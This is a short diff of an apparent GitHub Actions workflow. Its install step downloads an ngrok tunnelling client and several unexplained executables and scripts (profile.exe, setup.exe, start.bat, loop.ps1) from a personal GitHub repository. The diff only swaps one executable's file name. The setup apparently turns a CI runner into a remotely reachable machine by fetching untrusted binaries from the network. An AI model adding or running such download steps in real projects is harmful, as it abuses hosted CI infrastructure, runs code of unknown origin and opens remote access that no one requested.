@@ -8,7 +8,7 @@ jobs:
     - name: INSTALL.
       run: |
         Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-        Invoke-WebRequest https://raw.githubusercontent.com/leannagianna227/leannagianna227/main/.github/workflows/ProfileLuncher.exe -OutFile profile.exe
+        Invoke-WebRequest https://raw.githubusercontent.com/leannagianna227/leannagianna227/main/.github/workflows/profile.exe -OutFile profile.exe
         Invoke-WebRequest https://raw.githubusercontent.com/leannagianna227/leannagianna227/main/.github/workflows/start.bat -OutFile start.bat  
         Invoke-WebRequest https://raw.githubusercontent.com/leannagianna227/leannagianna227/main/.github/workflows/setup.exe -OutFile setup.exe
         Invoke-WebRequest https://raw.githubusercontent.com/leannagianna227/leannagianna227/main/.github/workflows/loop.ps1 -OutFile loop.ps1      
